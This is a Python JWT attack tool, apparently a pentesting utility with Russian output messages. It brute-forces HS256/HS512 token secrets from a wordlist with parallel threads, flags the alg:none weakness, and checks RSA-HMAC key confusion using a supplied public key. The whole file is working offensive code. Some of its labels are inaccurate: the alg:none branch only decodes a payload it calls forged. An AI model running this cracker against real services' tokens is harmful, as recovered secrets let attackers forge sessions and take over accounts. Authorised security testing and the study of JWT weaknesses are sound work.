import argparse
import jwt
from jwt import PyJWTError
import sys
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)


def print_banner():
    banner = f"""
    \t\t███████{Fore.RED}╗{Style.RESET_ALL}███████{Fore.RED}╗{Style.RESET_ALL} ██████{Fore.RED}╗{Style.RESET_ALL}██████{Fore.RED}╗ {Style.RESET_ALL}███████{Fore.RED}╗{Style.RESET_ALL}████████{Fore.RED}╗{Style.RESET_ALL}  
    \t\t██{Fore.RED}╔════╝{Style.RESET_ALL}██{Fore.RED}╔════╝{Style.RESET_ALL}██{Fore.RED}╔════╝{Style.RESET_ALL}██{Fore.RED}╔══{Style.RESET_ALL}██{Fore.RED}╗{Style.RESET_ALL}██{Fore.RED}╔════╝{Style.RESET_ALL}{Fore.RED}╚══{Style.RESET_ALL}██{Fore.RED}╔══╝{Style.RESET_ALL}
    \t\t███████{Fore.RED}╗{Style.RESET_ALL}█████{Fore.RED}╗{Style.RESET_ALL}  ██{Fore.RED}║     {Style.RESET_ALL}██{Fore.RED}║  {Style.RESET_ALL}██{Fore.RED}║{Style.RESET_ALL}█████{Fore.RED}╗     {Style.RESET_ALL}██{Fore.RED}║   {Style.RESET_ALL}  
    \t\t{Fore.RED}╚════{Style.RESET_ALL}██{Fore.RED}║{Style.RESET_ALL}██{Fore.RED}╔══╝  {Style.RESET_ALL}██{Fore.RED}║     {Style.RESET_ALL}██{Fore.RED}║  {Style.RESET_ALL}██{Fore.RED}║{Style.RESET_ALL}██{Fore.RED}╔══╝     {Style.RESET_ALL}██{Fore.RED}║   {Style.RESET_ALL}  
    \t\t███████{Fore.RED}║{Style.RESET_ALL}███████{Fore.RED}╗{Style.RESET_ALL}{Fore.RED}╚{Style.RESET_ALL}██████{Fore.RED}╗{Style.RESET_ALL}██████{Fore.RED}╔╝{Style.RESET_ALL}███████{Fore.RED}╗   {Style.RESET_ALL}██{Fore.RED}║   {Style.RESET_ALL}  
    \t\t{Fore.RED}╚══════╝╚══════╝ ╚═════╝╚═════╝ ╚══════╝   ╚═╝   {Style.RESET_ALL}  
    {Style.RESET_ALL}.______________________________________________________{Fore.RED}|_._._._._._._._._._.{Style.RESET_ALL}
    {Style.RESET_ALL} \_____________________________________________________{Fore.RED}|_#_#_#_#_#_#_#_#_#_|{Style.RESET_ALL}
                                                           {Fore.RED}l                      {Style.RESET_ALL}
    \t{Fore.RED}JWT Secret Brute-forcer {Fore.MAGENTA}| alg:HS256/HS512 | RSA-HMAC Confusion\n
    \t\t\t\t{Style.RESET_ALL}Created by {Fore.RED}SecDet Samurai{Style.RESET_ALL}
    """
    print(banner)


def color_status(text, status):
    colors = {
        '!': Fore.RED + Style.BRIGHT,
        '+': Fore.GREEN + Style.BRIGHT,
        '*': Fore.CYAN + Style.BRIGHT,
        '-': Fore.RED
    }
    return colors[status] + text + Style.RESET_ALL


def crack_hs(token, alg, wordlist, threads=8):
    def check_secret(secret):
        try:
            jwt.decode(token, secret.strip(), algorithms=[alg])
            return secret
        except (PyJWTError, Exception):
            return None

    try:
        with open(wordlist, 'r', errors='ignore') as f:
            secrets = [line.strip() for line in f if line.strip()]

            with ThreadPoolExecutor(max_workers=threads) as executor:
                for future in executor.map(check_secret, secrets):
                    if future:
                        return future

    except FileNotFoundError:
        print(color_status(f"[-] Файл {wordlist} не найден!", '-'))
        sys.exit(1)
    return None


def check_rsa_confusion(token, pubkey_path):
    try:
        with open(pubkey_path, 'r') as f:
            pubkey = f.read()
            for alg in ['HS256', 'HS512']:
                try:
                    jwt.decode(token, pubkey, algorithms=[alg])
                    return alg
                except (PyJWTError, Exception):
                    continue
    except Exception as e:
        print(color_status(f"[-] Ошибка чтения ключа: {e}", '-'))
    return None


def main():
    print_banner()
    parser = argparse.ArgumentParser(description='JWT cracker and vulnerability checker')
    parser.add_argument('-t', '--token', required=True, help='JWT token для атаки')
    parser.add_argument('-w', '--wordlist', help='Путь к файлу с секретами')
    parser.add_argument('-p', '--pubkey', help='Путь к RSA публичному ключу')
    parser.add_argument('--threads', type=int, default=8, help='Количество потоков')
    args = parser.parse_args()

    try:
        header = jwt.get_unverified_header(args.token)
    except Exception as e:
        print(color_status(f"[-] Невалидный JWT токен: {e}", '-'))
        sys.exit(1)

    alg = header.get('alg', '').upper()
    print(color_status(f"[*] Анализ токена с алгоритмом: {alg}", '*'))

    if alg == 'NONE':
        try:
            decoded = jwt.decode(args.token, options={'verify_signature': False})
            print(color_status("\n[!] Найдена критическая уязвимость: alg:none!", '!'))
            print(color_status(f"[+] Поддельный payload: {decoded}", '+'))
            sys.exit(0)
        except Exception as e:
            print(color_status(f"[-] Ошибка декодирования: {e}", '-'))
            sys.exit(1)

    if alg in ['HS256', 'HS512'] and args.wordlist:
        print(color_status(f"[*] Начало brute-force атаки ({alg}, потоки: {args.threads})...", '*'))
        found_secret = crack_hs(args.token, alg, args.wordlist, args.threads)
        if found_secret:
            print(color_status("\n[+] Секрет JWT взломан!", '+'))
            print(color_status(f"[+] Секрет: {found_secret}", '+'))
            try:
                decoded = jwt.decode(args.token, found_secret, algorithms=[alg])
                print(color_status(f"[+] Расшифрованный payload: {decoded}", '+'))
            except Exception as e:
                print(color_status(f"[-] Ошибка декодирования: {e}", '-'))
            sys.exit(0)
        else:
            print(color_status("\n[-] Не удалось подобрать секрет", '-'))
            sys.exit(1)

    if alg.startswith('RS') and args.pubkey:
        print(color_status("\n[*] Проверка RSA-HMAC key confusion...", '*'))
        success_alg = check_rsa_confusion(args.token, args.pubkey)
        if success_alg:
            print(color_status("\n[+] RSA-HMAC key confusion успешен!", '+'))
            print(color_status(f"[+] Валидация через {success_alg} с публичным ключом", '+'))
            try:
                decoded = jwt.decode(args.token, options={'verify_signature': False})
                print(color_status(f"[+] Расшифрованный payload: {decoded}", '+'))
            except Exception as e:
                print(color_status(f"[-] Ошибка декодирования: {e}", '-'))
            sys.exit(0)
        else:
            print(color_status("\n[-] Атака не удалась", '-'))
            sys.exit(1)

    print(color_status("\n[-] Уязвимости не найдены", '-'))
    print(color_status("[!] Используйте: -w для HS* или -p для RSA-HMAC", '!'))


if __name__ == "__main__":
    main()
